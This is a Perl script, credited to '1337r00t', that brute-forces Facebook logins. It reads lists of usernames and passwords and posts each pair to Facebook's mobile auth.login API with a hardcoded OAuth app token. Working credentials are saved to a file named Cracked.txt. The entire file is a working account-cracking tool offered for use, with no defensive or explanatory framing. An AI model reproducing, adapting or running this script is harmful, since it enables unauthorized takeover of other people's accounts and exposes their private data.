##########################################
use LWP::UserAgent; # ppm install LWP::UserAgent
##########################################
system('cls');
print qq(
################################
#  [Facebook API] BF FB API    #
################################
#     Coded By 1337r00t        #
################################
#                              #
#   Instagram : 1337r00t       #
#                              #
#    Twitter : _1337r00t       #
#                              #
################################
Enter [CTRL+C] For Exit :0\n);
print qq(
Enter Usernames File :
> );
$usernames=<STDIN>;
chomp($usernames);
open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
@USERS = <USERFILE>;
close USERFILE;

print qq(
Enter Passwords File :
> );
$passwords=<STDIN>;
chomp($passwords);
open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
@PASSS = <PASSFILE>;
close PASSFILE;
system('cls');
print "Username List: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
######################
foreach $username (@USERS) {
chomp $username;
	foreach $password (@PASSS) {
	chomp $password;
		#############################################
		$facebook = LWP::UserAgent->new();
		$facebook->default_header('Authorization' => "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16");
		$response = $facebook->post('https://b-api.facebook.com/method/auth.login',
			{ 
			format => 'json',
			email => $username,
			password => $password,
			credentials_type => 'password'
			}
			);
		if ($response->content=~ /"session_key"/) {
			print "\t			----------------------------------
			| Cracked :($username:$password) |\n
			----------------------------------\n
			";
			open(R0T,">>Cracked.txt");
			print R0T "($username:$password)\n";
			close(R0T);
			sleep(3);
		}
		else {
			#Invalid username or password (401)
			if ($response->content=~ /Invalid username or password/) {
				print "Failed :($username:$password)\n";
			}
			else
			{
				#Invalid username or email address (400)
				if ($response->content=~ /Invalid username or email address/) {
					print "NotFound :($username)\n";
				}
				else
				{
					print "Error\n";
				}
			}
		}
	}
}
